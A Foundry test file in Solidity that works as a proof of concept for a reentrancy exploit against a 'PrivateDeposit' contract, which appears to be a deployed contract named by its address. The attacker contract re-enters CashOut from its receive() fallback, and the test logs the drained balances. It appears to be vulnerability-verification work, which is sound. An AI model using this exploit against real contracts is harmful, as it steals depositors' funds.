// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x7a8721a9d64c74da899424c1b52acbf58ddc9782.sol";

contract MaliciousContract {
    PrivateDeposit private depositContract;
    uint public attackCount;
    uint public attackAmount;

    constructor(address payable _depositContractAddress) {
        depositContract = PrivateDeposit(_depositContractAddress);
    }

    function deposit() external payable {
        depositContract.Deposit{value: msg.value}();
    }

    function attack(uint _amount) external {
        attackAmount = _amount;
        depositContract.CashOut(_amount);
    }

    receive() external payable {
        if (attackCount < 1 && address(depositContract).balance >= attackAmount) {
            attackCount++;
            depositContract.CashOut(attackAmount);
        }
    }
}

contract PrivateDepositTest is Test {
    PrivateDeposit private depositContract;
    MaliciousContract private attacker;
    address private owner = address(1);
    address private attackerAddress = address(3);

    function setUp() public {
        vm.startPrank(owner);
        depositContract = new PrivateDeposit();
        vm.stopPrank();

        attacker = new MaliciousContract(payable(address(depositContract)));
        vm.deal(attackerAddress, 10 ether);
    }

    function testReentrancyAttack() public {
        // Fund the attacker contract through attackerAddress
        vm.prank(attackerAddress);
        (bool success,) = address(attacker).call{value: 5 ether}("");
        require(success, "Transfer failed");

        // Perform deposit through attacker contract
        vm.prank(attackerAddress);
        attacker.deposit{value: 5 ether}();

        // Check initial balance
        assertEq(address(depositContract).balance, 5 ether);

        console.log("--- BEFORE-Trigger Balances ---");
        uint256 depositContractBalanceBefore = address(depositContract).balance;
        uint256 attackerContractBalanceBefore = address(attacker).balance;
        console.log("PrivateDeposit contract ETH balance:", depositContractBalanceBefore, "wei");
        console.log("MaliciousContract ETH balance:", attackerContractBalanceBefore, "wei");

        console.log("--- Trigger Attack ---");
        vm.prank(attackerAddress);
        attacker.attack(5 ether);

        console.log("--- AFTER-Trigger Balances ---");
        uint256 depositContractBalanceAfter = address(depositContract).balance;
        uint256 attackerContractBalanceAfter = address(attacker).balance;
        console.log("PrivateDeposit contract ETH balance:", depositContractBalanceAfter, "wei");
        console.log("MaliciousContract ETH balance:", attackerContractBalanceAfter, "wei");

        uint256 attackerProfit = attackerContractBalanceAfter - attackerContractBalanceBefore;
        uint256 depositLoss = depositContractBalanceBefore - depositContractBalanceAfter;
        console.log("Attacker contract profit:", attackerProfit, "wei");
        console.log("PrivateDeposit contract loss:", depositLoss, "wei");
        
        bool vulnerabilityExists = attackerProfit > 5 ether;
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Reentrancy attack succeeded with extra ETH profits");
        } else {
            console.log("Vulnerability not Exist: Attacker didn't gain extra ETH");
        }
    }
}